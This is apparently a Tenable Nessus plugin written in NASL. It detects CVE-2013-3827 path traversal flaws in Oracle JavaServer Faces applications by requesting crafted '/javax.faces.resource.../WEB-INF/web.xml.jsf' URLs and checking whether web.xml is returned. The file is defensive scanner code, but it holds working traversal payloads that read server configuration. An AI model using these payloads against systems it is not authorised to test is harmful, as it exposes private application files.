#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(70963);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2015/09/24 23:21:18 $");

  script_cve_id("CVE-2013-3827");
  script_bugtraq_id(63052);
  script_osvdb_id(98461, 98969);
  script_xref(name:"CERT", value:"526012");

  script_name(english:"Oracle JavaServer Faces Multiple Partial Directory Traversals");
  script_summary(english:"Tries to read an application's web.xml");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A Java application hosted on the remote web server is affected by
multiple partial directory traversal vulnerabilities."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote web server contains a JavaServer Faces application that is
affected by multiple partial directory traversal vulnerabilities :

  - A defect exists in the handling of a resource identifier
    that allows for directory traversal within the
    application.

  - A defect exists in the handling of a library name that
    allows for directory traversal within the application.

Note that the application may also be affected by a ViewState HMAC
non-constant verification weakness; however, Nessus has not tested for
this. 

Note that this plugin will only report the first vulnerable
application."
  );
  # http://security.coverity.com/advisory/2013/Oct/two-path-traversal-defects-in-oracles-jsf2-implementation.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?5de4499a");
  # http://www.oracle.com/technetwork/topics/security/cpuoct2013-1899837.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ac29c174");
  script_set_attribute(attribute:"solution", value:"Install the patch per the instructions in the vendor's advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/10/15");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/10/14");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/11/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:oracle:fusion_middleware");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "webmirror.nasl");
  script_require_ports("Services/www", 80, 8080);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("webapp_func.inc");

port = get_http_port(default:8080);
cgis = get_kb_list_or_exit('www/' + port + '/cgi');

urls = make_list();
# To identify Java applications that we can test the exploit on
# we will look for files with the .jsf suffix from the KB and
# send the request to the application directory rather than the file itself
foreach cgi (make_list(cgis))
{
  match = eregmatch(pattern:"(^.*)(/.+\.(jsf))", string:cgi);
  if (match)
  {
    urls = make_list(urls, match[1]);
    if (!thorough_tests) break;
  }
}
if (max_index(urls) == 0) audit(AUDIT_WEB_FILES_NOT, "JavaServer Faces application", port);

# Determine which traversal to test against target host
paths = make_list('/javax.faces.resource.../WEB-INF/web.xml.jsf',
  '/javax.faces.resource./WEB-INF/web.xml.jsf?ln=..');

vuln = FALSE;

foreach url (urls)
{
  foreach path (paths)
  {
    vuln_url = url + path;

    res = http_send_recv3(
      method : "GET",
      port   : port,
      item   : vuln_url,
      exit_on_fail : TRUE
    );

    if (
       res[0] =~ "200 OK" &&
       "<web-app" >< res[2] &&
       "<servlet-class>javax.faces." >< res[2]
    )
    {
      vuln = TRUE;
      output = strstr(res[2], "<servlet-class>");
      if (isnull(output)) output = res[2];
      break;
    }
  }
  # Stop after first vulnerable web app is found
  if (vuln) break;
}

if (!vuln) exit(0, 'No vulnerable applications were detected on the web server listening on port '+port+'.');

if (report_verbosity > 0)
{
  max = 10;
  snip =  '\n'+crap(data:"-", length:30)+" snip "+crap(data:"-", length:30);

  header =
    'Nessus was able to verify the issue exists using the following request';
  trailer =
    'This produced the following output (truncated to '+max+' lines) :'+
    '\n' + snip + '\n' +
    beginning_of_response(resp:output, max_lines:max) + '\n' +
    snip + '\n';

  report = get_vuln_report(
    items   : vuln_url,
    port    : port,
    header  : header,
    trailer : trailer
  );
  security_warning(port:port, extra:report);
}
else security_warning(port);
